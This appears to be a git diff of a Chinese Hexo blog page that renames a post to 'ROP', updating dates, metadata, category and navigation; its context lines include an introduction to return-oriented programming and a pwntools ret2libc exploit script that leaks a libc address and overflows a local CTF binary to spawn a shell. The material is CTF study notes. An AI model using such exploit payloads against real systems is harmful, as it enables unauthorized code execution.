@@ -16,21 +16,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="title: 基本 ROP文中的文件见rop ​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，ROP一般指的是借助于栈缓冲区溢出手段，修改调函数栈帧中的返回地址。在程序进行返回的时候，会被转移到攻击者指定的地址，执行指定地址处的函数代码。从而形成">
+    <meta name="description" content="​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，ROP一般指的是借助于栈缓冲区溢出手段，修改调函数栈帧中的返回地址。在程序进行返回的时候，会被转移到攻击者指定的地址，执行指定地址处的函数代码。从而形成控制流劫持。而Gadget，指的是能够用来起到">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Poseidon">
-<meta property="og:url" content="http://example.com/2024/03/02/test/index.html">
+<meta property="og:title" content="ROP">
+<meta property="og:url" content="http://example.com/2024/03/09/rop/index.html">
 <meta property="og:site_name" content="Poseidon">
-<meta property="og:description" content="title: 基本 ROP文中的文件见rop ​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，ROP一般指的是借助于栈缓冲区溢出手段，修改调函数栈帧中的返回地址。在程序进行返回的时候，会被转移到攻击者指定的地址，执行指定地址处的函数代码。从而形成">
+<meta property="og:description" content="​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，ROP一般指的是借助于栈缓冲区溢出手段，修改调函数栈帧中的返回地址。在程序进行返回的时候，会被转移到攻击者指定的地址，执行指定地址处的函数代码。从而形成控制流劫持。而Gadget，指的是能够用来起到">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-03-02T14:17:15.074Z">
-<meta property="article:modified_time" content="2024-03-09T06:44:01.697Z">
+<meta property="article:published_time" content="2024-03-09T08:37:26.000Z">
+<meta property="article:modified_time" content="2024-03-09T08:39:45.939Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Poseidon</title>
+  <title>ROP - Poseidon</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -225,7 +225,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="ROP"></span>
           
         </div>
 
@@ -236,8 +236,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-02 22:17" pubdate>
-          2024年3月2日 晚上
+        <time datetime="2024-03-09 16:37" pubdate>
+          2024年3月9日 下午
         </time>
       </span>
     
@@ -259,7 +259,7 @@
         
         
         
-          35 分钟
+          34 分钟
         
       </span>
     
@@ -304,13 +304,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">ROP</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="title-基本-ROP"><a href="#title-基本-ROP" class="headerlink" title="title: 基本 ROP"></a>title: 基本 ROP</h1><p>文中的文件见<a href="/Users/mawenhui/Downloads/CTF/%E7%AC%94%E8%AE%B0/pwn/rop">rop</a></p>
-<p>​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，<strong>ROP一般指的是借助于栈缓冲区溢出手段，修改调函数栈帧中的返回地址。</strong>在程序进行返回的时候，会被转移到攻击者指定的地址，执行指定地址处的函数代码。从而形成控制流劫持。而Gadget，指的是能够用来起到攻击作用的，且程序中原有的代码片段<!--获取shell的控制权限-->。</p>
+                <p>​	随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，<strong>ROP一般指的是借助于栈缓冲区溢出手段，修改调函数栈帧中的返回地址。</strong>在程序进行返回的时候，会被转移到攻击者指定的地址，执行指定地址处的函数代码。从而形成控制流劫持。而Gadget，指的是能够用来起到攻击作用的，且程序中原有的代码片段<!--获取shell的控制权限-->。</p>
 <p>​	之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
 <ul>
 <li>程序存在溢出，并且可以控制返回地址。<!--存在溢出的函数：strcpy( )、strcat( )、gets( )、sprintf( )、vsprintf( )、scanf() 系列--></li>
@@ -476,12 +475,34 @@
 </ul>
 <p>exp 如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/" class="category-chain-item">pwn,栈溢出</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -492,8 +513,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://example.com/2024/03/02/test/</div>
+      <div>ROP</div>
+      <div>http://example.com/2024/03/09/rop/</div>
     </div>
     <div class="license-meta">
       
@@ -505,7 +526,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年3月2日</div>
+          <div>2024年3月9日</div>
         </div>
       
       
@@ -537,15 +558,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/03/07/hello-world/" title="Hello World">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Hello World</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2024/03/07/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
